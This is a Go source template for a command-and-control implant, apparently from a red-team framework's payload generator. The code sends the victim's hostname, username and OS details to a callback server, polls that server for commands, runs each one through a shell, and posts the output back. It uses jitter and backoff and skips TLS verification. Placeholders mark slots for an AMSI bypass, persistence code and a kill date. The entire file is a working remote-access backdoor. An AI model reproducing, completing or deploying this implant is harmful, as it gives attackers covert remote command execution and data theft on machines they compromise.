package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

const (
	CB       = "[CALLBACK]"
	FREQ     = [FREQ]
	JITTER   = [JITTER]
	RETRYMAX = [RETRY_MAX]
	LABEL    = "[LABEL]"
)

func main() {
	[PROXY_SETUP]
	[AMSI_BYPASS]
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr}

	hname, _ := os.Hostname()
	u, _ := user.Current()
	uname := u.Username
	osInfo := fmt.Sprintf("%s %s %s", runtime.GOOS, runtime.GOARCH, runtime.Version())

	checkin := map[string]string{"hostname": hname, "username": uname, "os_info": osInfo, "script": LABEL}
	data, _ := json.Marshal(checkin)
	resp, err := client.Post(CB+"/agent/checkin", "application/json", bytes.NewReader(data))
	if err != nil {
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var result map[string]interface{}
	json.Unmarshal(body, &result)
	agentId, ok := result["agent_id"].(string)
	if !ok || agentId == "" {
		return
	}
	[PERSIST_CODE]
	backoff := 1
	for {
		[KILLDATE_CHECK]
		func() {
			r, err := client.Get(fmt.Sprintf("%s/agent/cmd/%s", CB, agentId))
			if err != nil {
				if RETRYMAX > 1 && backoff < RETRYMAX {
					backoff++
				}
				return
			}
			defer r.Body.Close()
			if r.StatusCode == 200 {
				backoff = 1
				b, _ := io.ReadAll(r.Body)
				var cmd map[string]interface{}
				json.Unmarshal(b, &cmd)
				cmdId := fmt.Sprintf("%v", cmd["id"])
				command := fmt.Sprintf("%v", cmd["command"])
				out, err := exec.Command("sh", "-c", command).CombinedOutput()
				if err != nil {
					out = append(out, []byte(err.Error())...)
				}
				client.Post(fmt.Sprintf("%s/agent/res/%s", CB, cmdId), "text/plain", bytes.NewReader(out))
			} else {
				if RETRYMAX > 1 && backoff < RETRYMAX {
					backoff++
				}
			}
		}()
		s := float64(FREQ * backoff)
		if JITTER > 0 {
			s *= 1 + (rand.Float64()*2-1)*float64(JITTER)/100
		}
		if s < 1 {
			s = 1
		}
		time.Sleep(time.Duration(s * float64(time.Second)))
	}
}
